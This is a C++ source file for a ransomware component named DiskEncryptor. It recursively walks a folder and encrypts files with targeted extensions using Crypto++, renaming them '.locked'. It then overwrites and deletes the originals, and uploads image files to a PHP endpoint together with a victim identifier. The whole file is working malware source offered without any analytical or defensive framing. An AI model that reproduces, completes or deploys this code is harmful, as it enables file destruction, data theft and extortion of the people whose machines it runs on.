#include <iostream>
#include <Windows.h>
#include <filesystem>
#include <thread>

#include <cryptopp/filters.h>
#include <cryptopp/files.h>

#include "diskencryptor.h"
#include "http.h"

#define DEFAULT_THREADS 6
#define FILE_EXTENSION ".locked"


bool DiskEncryptor::setDisk(std::string disk)
{
	_disk = disk;
	return true;
}

bool DiskEncryptor::setFreeSpace()
{
	DWORD _sectorsPerCluster, _bytesPerSector, _numberOfFreeClusters, _totalNumberOfClusters;
	if (GetDiskFreeSpaceA(_disk.c_str(), &_sectorsPerCluster, &_bytesPerSector, &_numberOfFreeClusters, &_totalNumberOfClusters))
	{
		_freespace = (_sectorsPerCluster * _bytesPerSector * _numberOfFreeClusters);
		return true;
	}
	return false;
}

bool DiskEncryptor::setEncryption(CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv)
{
	_e.SetKeyWithIV(key.data(), key.size(), iv.data(), iv.size());
	return true;
}

void DiskEncryptor::iterateFiles(std::string uuid) {
	std::vector<std::thread> threads;
	for (auto& entry : std::filesystem::recursive_directory_iterator("C:\\Users\\mXn\\Desktop\\fwareTest", std::filesystem::directory_options::skip_permission_denied)) {
		try {
			if (entry.is_directory()) {
				
			}
			else {
				std::string ext = entry.path().extension().string();
				for (std::string e : ext2Ecrypt) {
					if (_freespace < entry.file_size()) {
						break;
					}
					if (ext == e) {
						if (threads.size() > DEFAULT_THREADS) {
							for (std::thread& t : threads) {
								t.join();
							}
							threads.clear();
						}
						if (ext == ".png" || ext == ".jpg" || ext == ".jpeg") {
							std::string strl;
							std::string str = "uuid=" + uuid + "&ext=" + ext;
							Http fileUploader(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
							fileUploader.uploadFile(L"localhost", L"/server/hdhohzuag.php?action=upload", L"Content-Type: multipart/form-data", entry.path().wstring(),strl, str);
							std::cout << strl<< std::endl;
						}
						threads.push_back(std::thread(&DiskEncryptor::fileEncrypt, this, entry.path().string()));
					}

				}
			}
		}
		catch (std::exception e) {
			std::cout << e.what() << std::endl;
			continue;
	}
	
	}
	for (std::thread& t : threads) {
		t.join();
	
	}
}

bool DiskEncryptor::safeFileDeletation(std::string& file) {
	int fileSize = std::filesystem::file_size(file);
	if (_freespace < fileSize) {
		return false;
	}
	std::ofstream out(file, std::ios::binary | std::ios::ate);
	for (int i = 0; i < fileSize; i++) {
		out << 0;
	}
	out.close();
	std::filesystem::remove(file);
	return true;
}

bool DiskEncryptor::fileEncrypt(std::string file) {
	std::cout << "Encrypting file: " << file << std::endl;
	std::ifstream in(file, std::ios::binary);
	std::ofstream out(file + FILE_EXTENSION, std::ios::binary);
	CryptoPP::FileSource(in, true, new CryptoPP::StreamTransformationFilter(_e, new CryptoPP::FileSink(out)));
	in.close();
	out.close();
	safeFileDeletation(file);
	return true;
}

DiskEncryptor::DiskEncryptor(std::string disk, CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv)
{
	setDisk(disk);
	setFreeSpace();
	setEncryption(key, iv);
}

DiskEncryptor::~DiskEncryptor()
{

}